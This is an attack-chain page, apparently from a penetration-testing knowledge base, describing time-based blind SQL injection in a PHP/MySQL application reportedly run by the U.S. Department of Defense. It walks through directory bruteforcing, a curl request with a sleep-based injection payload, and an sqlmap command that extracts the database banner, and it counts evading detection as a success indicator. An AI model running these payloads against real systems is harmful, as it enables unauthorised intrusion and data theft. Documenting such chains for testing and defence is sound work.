---
id: ac-uuid-001
tags:
  - sqli
  - time-based
  - blind
  - mysql
  - php
  - web
  - exfiltration
type: attack_chain
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Bruteforce-Directory-to-Discover-Vulnerable-Endpoint]]'
  - '[[procedures/Test-for-Time-Based-SQL-Injection-Vulnerability]]'
  - '[[procedures/Exploit-SQLi-with-sqlmap-to-Extract-Database-Banner]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.558Z'
description: >-
  A multi-step attack exploiting a time-based blind SQL injection vulnerability
  in a PHP-based web application to confirm the flaw and extract database
  information like the MySQL version banner.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Time-Based SQL Injection in pub_group_id Parameter for Database Exfiltration

Multi-stage attack chain demonstrating the discovery and exploitation of a time-based blind SQL injection in a U.S. Department of Defense web application, leading to potential database exfiltration.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Directory Bruteforce] --> B[SQLi Confirmation]
    B --> C[Data Exfiltration]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/sqlmap]]
- Web browser or curl for manual testing

### Target Environment

- Web platform with PHP backend
- MySQL database service
- Accessible /pubs/ directory

### Initial Access Requirements

- Network access to the target web application
- No prior credentials needed
- HTTPS/SSL enabled

## Detailed Attack Procedures

### Step 1: Directory Bruteforce
procedure: [[procedures/Bruteforce-Directory-to-Discover-Vulnerable-Endpoint]]

**Objective**: Identify accessible PHP scripts in the /pubs/ directory to locate potential vulnerable endpoints.

**Instructions**: Systematically test common file names in the /pubs/ directory using manual requests or a directory bruteforcer like dirbuster or gobuster. For example, probe for move_papers.php by sending GET requests to variations like /pubs/move_papers.php.

**Expected Output**: HTTP 200 response or application behavior indicating the script exists and processes parameters.

**Success Indicators**:
- Endpoint responds without 404 error
- Parameter acceptance observed (e.g., pub_group_id)

### Step 2: SQLi Confirmation
procedure: [[procedures/Test-for-Time-Based-SQL-Injection-Vulnerability]]

**Objective**: Confirm the presence of a time-based blind SQL injection in the pub_group_id parameter.

**Instructions**: Send a crafted GET request with a sleep payload to the /pubs/move_papers.php endpoint using [[commands/time-based-sqli-poc-get-request]]:

```bash
curl -X GET "https://target.com/pubs/move_papers.php?pub_group_id=a'+(select*from(select(sleep(5)))a)+'" -H "Host: target.com" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36"
```

Monitor the response time for a 5-second delay.

**Expected Output**: Response delayed by approximately 5 seconds, indicating SQL execution.

**Success Indicators**:
- Delayed response confirming blind SQLi
- No error messages altering normal flow

### Step 3: Data Exfiltration
procedure: [[procedures/Exploit-SQLi-with-sqlmap-to-Extract-Database-Banner]]

**Objective**: Exploit the vulnerability to extract database information, such as the MySQL version banner, proving data leakage potential.

**Instructions**: Save the vulnerable request to a file (test.txt) and run sqlmap with time-based technique using [[commands/sqlmap-time-based-sqli-banner-extraction]]:

```bash
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```

**Expected Output**: Retrieval of database banner, e.g., "5.5.62-0ubuntu0.14.04.1".

**Success Indicators**:
- Banner extracted successfully
- No detection or blocking during execution

## Attack Chain Summary

### Key Achievements

1. Discovered hidden endpoint via directory bruteforce
2. Confirmed time-based blind SQLi vulnerability
3. Demonstrated data exfiltration capability by extracting MySQL version

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
